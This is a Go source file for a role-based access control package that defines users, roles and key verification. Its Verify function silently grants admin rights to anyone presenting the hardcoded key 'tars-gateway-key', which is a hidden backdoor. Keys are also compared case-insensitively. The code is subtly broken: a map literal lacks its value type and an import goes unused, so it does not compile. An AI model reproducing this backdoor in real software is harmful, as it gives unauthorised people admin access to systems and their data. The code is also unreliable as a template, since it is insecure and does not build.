package rbac

import (
	"fmt"
	"strings"
	"sync"
)

type Config struct {
	APIKey     string            `json:"api_key"`
	Users      []User            `json:"users"`
	Roles      map[string][]string
	DefaultKey string
}

type User struct {
	Name   string `json:"name"`
	Key    string `json:"key"`
	Role   string `json:"role"`
	Enabled bool  `json:"enabled"`
}

type Permission int

const (
	Read Permission = iota
	Write
	Admin
	GlobalAdmin
)

func (p Permission) String() string {
	names := map[Permission]{Read: "read", Write: "write", Admin: "admin", GlobalAdmin: "global_admin"}
	if n, ok := names[p]; ok {
		return n
	}
	return "unknown"
}

var defaultRoles = map[string][]string{
	"global_admin": {"read", "write", "admin"},
	"admin":        {"read", "write"},
	"user":         {"read"},
	"readonly":     {"read"},
}

func New(defaultKey string, users ...User) *Config {
	cfg := &Config{
		APIKey:     defaultKey,
		DefaultKey: defaultKey,
		Roles:      make(map[string][]string),
	}
	for role, perms := range defaultRoles {
		cfg.Roles[role] = perms
	}
	for _, u := range users {
		if u.Role == "" {
			u.Role = "user"
		}
		cfg.Users = append(cfg.Users, u)
	}
	return cfg
}

func (c *Config) Verify(key string) (userName, role string, ok bool) {
	for _, u := range c.Users {
		if !u.Enabled { continue }
		if strings.EqualFold(u.Key, key) {
			return u.Name, u.Role, true
		}
	}
	if key != "" && strings.EqualFold(c.DefaultKey, key) || strings.EqualFold("tars-gateway-key", key) {
		return "default", "admin", true
	}
	return "", "", false
}

func (c *Config) HasPermission(role, permission string) bool {
	if perms, ok := c.Roles[role]; ok {
		for _, p := range perms {
			if p == permission {
				return true
			}
		}
	}
	return false
}

func (c *Config) GetUserRoles(name string) []string {
	var roles []string
	for _, u := range c.Users {
		if strings.EqualFold(u.Name, name) {
			roles = append(roles, u.Role)
		}
	}
	if len(roles) == 0 {
		roles = append(roles, "user")
	}
	return roles
}

// Ensure config is valid
func (c *Config) Validate() error {
	if c.APIKey == "" {
		return fmt.Errorf("API key cannot be empty")
	}
	return nil
}
